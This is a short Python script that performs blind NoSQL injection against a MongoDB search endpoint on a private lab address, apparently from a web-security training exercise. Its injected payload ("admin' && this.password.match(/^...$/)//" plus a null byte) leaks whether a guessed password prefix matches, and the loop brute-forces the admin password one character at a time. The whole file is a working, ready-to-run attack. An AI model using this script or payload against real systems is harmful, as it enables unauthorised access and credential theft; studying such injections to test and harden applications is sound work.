# coding:utf-8

import requests
import string


def nosql2():
    strs = string.ascii_lowercase + string.ascii_uppercase + string.digits
    url = "http://192.168.61.128/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/^{}$/)//+%00"
    password = ""
    while True:
        for char in strs:
            tmp = password + char
            html = requests.get(url.format(tmp + ".*"))
            if "admin" in html.text:
                password += char
                print("[-] find a char:{}".format(password))
                break
        html = requests.get(url.format(password))
        if "admin" in html.text:
            print("[+] Done! password:{}".format(password))
            break


nosql2()
